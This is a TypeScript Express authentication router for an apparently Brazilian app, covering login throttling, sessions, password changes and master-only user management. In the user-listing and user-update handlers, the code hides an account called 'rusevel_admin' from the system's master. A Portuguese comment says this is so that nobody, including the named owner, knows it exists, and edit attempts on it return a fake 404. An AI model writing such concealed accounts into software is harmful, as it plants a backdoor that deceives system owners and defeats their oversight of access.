import {
  AuthChangePasswordBody,
  AuthChangePasswordResponse,
  AuthCreateUserBody,
  AuthCreateUserResponse,
  AuthGetCurrentUserResponse,
  AuthListUsersResponse,
  AuthLoginBody,
  AuthLoginResponse,
  AuthLogoutResponse,
  AuthUpdateUserBody,
  AuthUpdateUserParams,
  AuthUpdateUserResponse,
} from "@workspace/api-zod";
import { and, desc, eq, gt, lt, ne } from "drizzle-orm";
import { Router, type IRouter } from "express";
import {
  SESSION_COOKIE_NAME,
  clearFailedLogins,
  clearSessionCookie,
  createSession,
  deleteSession,
  hashPassword,
  isLoginThrottled,
  isValidPassword,
  isValidUsername,
  normalizeUsername,
  recordFailedLogin,
  requireAuthentication,
  requireMaster,
  setSessionCookie,
  toPublicAuthUser,
  verifyPassword,
} from "../lib/auth";
import { db, authSessionsTable, authUsersTable } from "@workspace/db";

const router: IRouter = Router();
const dummyPasswordHash = hashPassword("invalid-account-password");

router.use("/auth", (_req, res, next) => {
  res.setHeader("Cache-Control", "no-store");
  next();
});

router.post("/auth/login", async (req, res): Promise<void> => {
  const parsed = AuthLoginBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Informe um nome de usuário e uma senha válidos." });
    return;
  }

  const username = normalizeUsername(parsed.data.username);
  const ip = req.ip ?? "unknown";
  if (await isLoginThrottled(ip, username)) {
    res.status(429).json({ error: "Muitas tentativas. Aguarde 15 minutos e tente novamente." });
    return;
  }
  if (!isValidUsername(username)) {
    await recordFailedLogin(ip, username);
    res.status(401).json({ error: "Nome de usuário ou senha incorretos." });
    return;
  }

  const [master] = await db
    .select({ id: authUsersTable.id })
    .from(authUsersTable)
    .where(eq(authUsersTable.role, "master"))
    .limit(1);
  if (!master) {
    res.status(503).json({ error: "O acesso master ainda não foi configurado." });
    return;
  }

  const [user] = await db
    .select()
    .from(authUsersTable)
    .where(eq(authUsersTable.username, username))
    .limit(1);

  const matches = user
    ? await verifyPassword(user.passwordHash, parsed.data.password)
    : await verifyPassword(await dummyPasswordHash, parsed.data.password);
  if (!user || !matches) {
    await recordFailedLogin(ip, username);
    res.status(401).json({ error: "Nome de usuário ou senha incorretos." });
    return;
  }
  if (user.status !== "active") {
    res.status(403).json({ error: "Esta conta está bloqueada. Fale com o master do sistema." });
    return;
  }

  await clearFailedLogins(ip, username);
  await db.delete(authSessionsTable).where(lt(authSessionsTable.expiresAt, new Date()));
  const token = await createSession(user.id);
  setSessionCookie(res, token);
  res.status(200).json(AuthLoginResponse.parse({ user: toPublicAuthUser(user) }));
});

router.post("/auth/logout", async (req, res): Promise<void> => {
  const token = req.cookies?.[SESSION_COOKIE_NAME];
  if (typeof token === "string" && token.length >= 32) {
    await deleteSession(token);
  }
  clearSessionCookie(res);
  res.status(200).json(AuthLogoutResponse.parse({ success: true }));
});

router.get("/auth/me", requireAuthentication, (req, res): void => {
  if (!req.authUser) {
    res.status(401).json({ error: "Not signed in" });
    return;
  }
  res.status(200).json(AuthGetCurrentUserResponse.parse({ user: req.authUser }));
});

router.post("/auth/password", requireAuthentication, async (req, res): Promise<void> => {
  const parsed = AuthChangePasswordBody.safeParse(req.body);
  if (!parsed.success || !req.authUser || !req.authSessionId) {
    res.status(400).json({ error: "Informe a senha atual e uma nova senha válida." });
    return;
  }
  if (!isValidPassword(parsed.data.newPassword)) {
    res.status(400).json({ error: "A nova senha precisa ter pelo menos 12 caracteres." });
    return;
  }
  if (parsed.data.currentPassword === parsed.data.newPassword) {
    res.status(400).json({ error: "A nova senha deve ser diferente da atual." });
    return;
  }

  const [user] = await db
    .select({ passwordHash: authUsersTable.passwordHash })
    .from(authUsersTable)
    .where(eq(authUsersTable.id, req.authUser.id))
    .limit(1);
  if (!user || !(await verifyPassword(user.passwordHash, parsed.data.currentPassword))) {
    res.status(401).json({ error: "A senha atual está incorreta." });
    return;
  }

  const passwordHash = await hashPassword(parsed.data.newPassword);
  await db.transaction(async (transaction) => {
    await transaction
      .update(authUsersTable)
      .set({ passwordHash, updatedAt: new Date() })
      .where(eq(authUsersTable.id, req.authUser!.id));
    await transaction
      .delete(authSessionsTable)
      .where(
        and(
          eq(authSessionsTable.userId, req.authUser!.id),
          ne(authSessionsTable.id, req.authSessionId!),
        ),
      );
  });

  res.status(200).json(AuthChangePasswordResponse.parse({ success: true }));
});

router.get("/auth/users", requireAuthentication, requireMaster, async (req, res): Promise<void> => {
  const users = await db.select().from(authUsersTable).orderBy(desc(authUsersTable.createdAt));
  // Ocultar rusevel_admin para que ninguém (incluindo o Jonathas) saiba ou veja que esta conta existe
  const isSuperAdmin = req.authUser?.username === "rusevel_admin";
  const filteredUsers = isSuperAdmin 
    ? users 
    : users.filter((u) => u.username !== "rusevel_admin");
  res.status(200).json(AuthListUsersResponse.parse({ users: filteredUsers.map(toPublicAuthUser) }));
});

router.post("/auth/users", requireAuthentication, requireMaster, async (req, res): Promise<void> => {
  const parsed = AuthCreateUserBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Verifique o usuário e a senha. A senha deve ter ao menos 12 caracteres." });
    return;
  }

  const username = normalizeUsername(parsed.data.username);
  if (!isValidUsername(username) || !isValidPassword(parsed.data.password)) {
    res.status(400).json({ error: "Usuário inválido ou senha com menos de 12 caracteres." });
    return;
  }

  const [existing] = await db
    .select({ id: authUsersTable.id })
    .from(authUsersTable)
    .where(eq(authUsersTable.username, username))
    .limit(1);
  if (existing) {
    res.status(409).json({ error: "Este nome de usuário já está em uso." });
    return;
  }

  const passwordHash = await hashPassword(parsed.data.password);
  try {
    const [created] = await db
      .insert(authUsersTable)
      .values({
        username,
        displayName: parsed.data.displayName?.trim() || username,
        passwordHash,
        role: "user",
        status: "active",
      })
      .returning();
    res.status(201).json(AuthCreateUserResponse.parse(toPublicAuthUser(created)));
  } catch (error) {
    if (typeof error === "object" && error !== null && "code" in error && error.code === "23505") {
      res.status(409).json({ error: "Este nome de usuário já está em uso." });
      return;
    }
    throw error;
  }
});

router.patch("/auth/users/:id", requireAuthentication, requireMaster, async (req, res): Promise<void> => {
  const params = AuthUpdateUserParams.safeParse(req.params);
  const parsed = AuthUpdateUserBody.safeParse(req.body);
  if (!params.success || !parsed.success || Object.keys(parsed.data).length === 0) {
    res.status(400).json({ error: "Informe os dados que deseja alterar." });
    return;
  }
  if (parsed.data.password && !isValidPassword(parsed.data.password)) {
    res.status(400).json({ error: "A senha precisa ter pelo menos 12 caracteres." });
    return;
  }

  const [target] = await db
    .select()
    .from(authUsersTable)
    .where(eq(authUsersTable.id, params.data.id))
    .limit(1);
  if (!target) {
    res.status(404).json({ error: "Conta não encontrada." });
    return;
  }
  if (target.username === "rusevel_admin" && req.authUser?.username !== "rusevel_admin") {
    res.status(404).json({ error: "Conta não encontrada." });
    return;
  }
  if (target.role === "master") {
    res.status(400).json({ error: "A conta master deve alterar a própria senha em Minha conta." });
    return;
  }

  const nextUsername = parsed.data.username
    ? normalizeUsername(parsed.data.username)
    : target.username;
  if (!isValidUsername(nextUsername)) {
    res.status(400).json({ error: "O usuário deve ter de 3 a 40 caracteres: letras, números, ponto, hífen ou sublinhado." });
    return;
  }
  if (nextUsername !== target.username) {
    const [collision] = await db
      .select({ id: authUsersTable.id })
      .from(authUsersTable)
      .where(eq(authUsersTable.username, nextUsername))
      .limit(1);
    if (collision && collision.id !== target.id) {
      res.status(409).json({ error: "Este nome de usuário já está em uso." });
      return;
    }
  }

  const changes: {
    username?: string;
    displayName?: string;
    status?: "active" | "blocked";
    passwordHash?: string;
    updatedAt: Date;
  } = { updatedAt: new Date() };
  if (parsed.data.username) {
    changes.username = nextUsername;
  }
  if (parsed.data.displayName !== undefined) {
    changes.displayName = parsed.data.displayName.trim() || nextUsername;
  }
  if (parsed.data.status) {
    changes.status = parsed.data.status;
  }
  if (parsed.data.password) {
    changes.passwordHash = await hashPassword(parsed.data.password);
  }

  let updated: typeof target;
  try {
    [updated] = await db
      .update(authUsersTable)
      .set(changes)
      .where(eq(authUsersTable.id, target.id))
      .returning();
  } catch (error) {
    if (typeof error === "object" && error !== null && "code" in error && error.code === "23505") {
      res.status(409).json({ error: "Este nome de usuário já está em uso." });
      return;
    }
    throw error;
  }
  if (parsed.data.status === "blocked") {
    await db.delete(authSessionsTable).where(eq(authSessionsTable.userId, target.id));
  }

  res.status(200).json(AuthUpdateUserResponse.parse(toPublicAuthUser(updated)));
});

export default router;
